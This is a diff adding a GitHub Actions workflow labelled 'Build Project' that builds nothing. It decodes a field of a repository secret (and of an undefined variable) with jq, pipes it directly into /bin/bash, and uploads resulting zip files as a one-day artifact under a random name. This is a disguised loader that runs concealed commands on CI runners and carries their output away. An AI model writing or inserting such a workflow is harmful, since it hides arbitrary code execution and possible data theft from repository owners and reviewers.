@@ -1,0 +1,27 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          l20: ${{ secrets.l20 }}
+        run: |
+          printf '%s' "$l20" | jq -r .m876 | /bin/bash
+          printf '%s' "$qpar6" | jq -r .prol287 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: pz1gbdHY
+          path: "*.zip"
+          retention-days: 1
